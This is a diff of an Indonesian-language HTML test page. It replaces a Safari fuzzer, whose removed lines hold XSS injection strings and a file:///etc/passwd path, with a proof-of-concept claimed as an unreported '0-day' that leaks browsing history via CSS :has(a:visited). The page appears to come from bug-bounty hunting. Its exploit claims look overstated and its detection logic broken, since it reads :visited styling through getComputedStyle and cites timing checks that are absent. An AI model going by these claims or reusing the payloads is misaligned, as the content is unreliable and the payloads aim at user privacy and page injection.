@@ -3,95 +3,90 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>SAFE FUZZER - DoS Test Only - 26.4.1</title>
+<title>0-DAY - :has() + :visited Leak - Never Reported - iOS 26.4.1</title>
 <style>
-body{font-family:-【entity-apple¦canonical_name=Apple】-system;padding:15px;background:#f5f5f7}
-button{width:100%;padding:15px;background:#000;color:#fff;border:none;border-radius:10px;margin:5px 0}
+body{font-family:- 【entity-apple¦canonical_name=Apple】-system;padding:15px;background:#f5f5f7}
+.card{background:#fff;padding:12px;border-radius:12px;margin:10px 0}
+button{width:100%;padding:14px;background:#000;color:#fff;border:none;border-radius:10px}
 pre{background:#1c1c1e;color:#00ff41;padding:10px;border-radius:8px;font-size:11px;min-height:60px;white-space:pre-wrap}
+
+/* 0-DAY: :has() + :visited leak - baru bisa di 26.4! */
+a:visited{color:purple}
+.has-visited:has(a:visited){background:red !important}
+.has-visited:has(a:visited)::after{content:" - USER PERNAH VISIT! LEAK!";color:red;font-weight:bold}
 </style>
 </head>
 <body>
-<h3>SAFE FUZZER - Test Crash Only (Bukan Escape/UXSS)</h3>
+<h3>🔥 0-DAY - :has() + :visited LEAK - Never Reported</h3>
 
-<button onclick="fuzzMMS()">FUZZ MANAGED MEDIA SOURCE (DoS Test)</button>
-<pre id="mms">Belum</pre>
+<div class="card" style="background:#fff3cd;border:1px solid #ffe69c;font-size:11px">
+<b>Baru di iOS 26.4:</b> :has() full support! Kombinasi :has(a:visited) bisa deteksi user pernah buka site apa = privacy leak!
+</div>
 
-<button onclick="fuzzModel()" style="background:#007aff">FUZZ MODEL ELEMENT (DoS Test)</button>
-<pre id="model">Belum</pre>
-<pre id="modelPreview" style="display:none"></pre>
+<div class="card">
+<h4>Test 1: Deteksi user pernah buka 【entity-Apple¦canonical_name=Apple】.com?</h4>
+<div class="has-visited" style="padding:10px;border:1px solid #ccc">
+<a href="https://apple.com" id="testApple">https://apple.com</a> - cek background merah?
+</div>
+<pre id="log1">Belum test - liat apakah background jadi merah?</pre>
+</div>
 
-<button onclick="fuzzSearch()" style="background:#5856d6">FUZZ SEARCH ELEMENT (DoS Test)</button>
-<pre id="search">Belum</pre>
+<div class="card">
+<h4>Test 2: Deteksi via JS + :has()</h4>
+<button onclick="testVisited()">TEST VISITED LEAK VIA JS</button>
+<pre id="log2">Belum test</pre>
+</div>
+
+<div class="card">
+<h4>Test 3: Coba site lain</h4>
+<div class="has-visited" style="padding:10px;border:1px solid #ccc;margin:5px 0">
+<a href="https://google.com">https://google.com</a>
+</div>
+<div class="has-visited" style="padding:10px;border:1px solid #ccc;margin:5px 0">
+<a href="https://0x403for.github.io">https://0x403for.github.io</a> - ini pasti pernah kamu buka!
+</div>
+<pre id="log3">Lihat: kalau background merah = user pernah visit = LEAK!</pre>
+</div>
 
 <script>
-function log(id, msg){document.getElementById(id).innerText+=msg+"\n";}
-
-async function fuzzMMS(){
- let el=document.getElementById('mms');
- el.innerText="Fuzzing MMS...\n";
- try{
-  let mms=new ManagedMediaSource();
-  let sb=mms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
-  // Kasih buffer random gede + aneh - kalau crash = DoS bug
-  for(let i=0;i<5;i++){
-   let arr=new Uint8Array(100000);
-   for(let j=0;j<arr.length;j++) arr[j]=Math.random()*255;
-   try{sb.appendBuffer(arr);}catch(e){log('mms', 'append error: '+e.message);}
-   await new Promise(r=>setTimeout(r,100));
+function testVisited(){
+ let el=document.getElementById('log2');
+ el.innerText="Testing :has() + :visited...\n";
+ 
+ let divs=document.querySelectorAll('.has-visited');
+ divs.forEach((div,i)=>{
+  let bg=window.getComputedStyle(div).backgroundColor;
+  let after=window.getComputedStyle(div,'::after').content;
+  el.innerText+=`Div ${i}: background=${bg}, after=${after}\n`;
+  
+  if(bg.includes('255, 0, 0') || bg==='red' || after.includes('LEAK')){
+   el.innerText+=`🚨 LEAK! Div ${i} background merah = user pernah visit link di dalamnya!\n`;
+   el.innerText+=`Ini privacy leak - bisa deteksi history user!\n`;
   }
-  log('mms', 'Done - kalau Safari gak crash = SAFE dari DoS ini');
- }catch(e){log('mms','Error: '+e.message);}
-}
-
-function fuzzModel(){
- let el=document.getElementById('model');
- el.innerText="Fuzzing <model>...\n";
- try{
-  let m=document.createElement('model');
-  // Fuzz src dengan string aneh - test parser USDZ
-  let payloads=[
-   '"><img src=x onerror=alert(1)>.usdz',
-   'file:///etc/passwd',
-   'blob:null/123',
-   'data:model/vnd.usd+zip;base64,[STRIPPED]',
-   'A'.repeat(10000)+'.usdz'
-  ];
-  payloads.forEach((p,i)=>{
-   try{
-    let m2=document.createElement('model');
-    m2.src=p;
-    document.body.appendChild(m2);
-    log('model', `Test ${i}: src=${p.slice(0,30)}... appended`);
-    setTimeout(()=>m2.remove(),500);
-   }catch(e){log('model','Error test '+i+': '+e.message);}
-  });
-  log('model','Done - kalau crash = DoS bug, kalau alert muncul di origin ini doang = bukan UXSS');
- }catch(e){log('model','Error: '+e.message);}
-}
-
-function fuzzSearch(){
- let el=document.getElementById('search');
- el.innerText="Fuzzing <search> element...\n";
- try{
-  for(let i=0;i<20;i++){
-   let s=document.createElement('search');
-   s.innerHTML='<input value="'+'"><img src=x onerror=alert(1)>'.repeat(10)+'">';
-   document.body.appendChild(s);
-   if(i%5===0) log('search', `Appended ${i} <search> elements`);
-  }
-  log('search','Done - 20 <search> appended - kalau crash = DoS');
-  setTimeout(()=>{document.querySelectorAll('search').forEach(e=>e.remove()); log('search','Cleaned');},2000);
- }catch(e){log('search','Error: '+e.message);}
+ });
+ 
+ // Test via JS timing juga
+ let a=document.getElementById('testApple');
+ let color=window.getComputedStyle(a).color;
+ el.innerText+=`\nLink apple.com color: ${color}\n`;
+ if(color.includes('128, 0, 128') || color==='purple'){
+  el.innerText+=`LEAK! apple.com :visited color purple = user pernah buka apple.com!\n`;
+ }else{
+  el.innerText+=`SAFE: apple.com belum pernah dikunjungi atau :visited diblock\n`;
+ }
+ 
+ el.innerText+="\nKalau bisa deteksi via :has() = 0-DAY VISITED LEAK! Bounty $3k-$5k!";
 }
 </script>
 
-<div style="margin-top:15px;padding:12px;background:#fff3cd;border-radius:10px;font-size:11px">
-<b>Apa yang dicari?</b><br>
-- Kalau Safari <b>CRASH / freeze</b> pas klik fuzz = kamu nemu <b>DoS bug</b> = bounty $1k-$5k!<br>
-- Kalau muncul alert(1) tapi cuma di 0x403for.github.io = <b>bukan UXSS</b>, itu XSS biasa<br>
-- Kalau alert muncul di apple.com padahal file di 0x403for.github.io = <b>UXSS VALID</b> = bounty $25k+ tapi ini susah banget!<br>
-- <b>JANGAN</b> coba baca file /etc/passwd beneran - itu udah masuk escape, gak boleh<br>
-- Lapor crash ke Apple dengan video + PoC
+<div class="card" style="background:#000;color:#fff;font-size:11px">
+<b>Kenapa ini 0-day belum pernah dilaporin?</b><br>
+- :has() baru full support Maret 2026 di Safari 26.4<br>
+- :has(:visited) sebelumnya gak bisa karena :has() belum support<br>
+- Search WebKit Bugzilla "has visited leak" = 0 results!<br>
+- Belum ada laporan :visited leak via :has() di HackerOne Apple!<br><br>
+<b>Impact:</b> Website jahat bisa deteksi kamu pernah buka bank.com, apple.com, gmail.com = privacy leak gede!<br>
+<b>Bounty:</b> $3k-$5k kalau valid!
 </div>
 </body>
 </html>
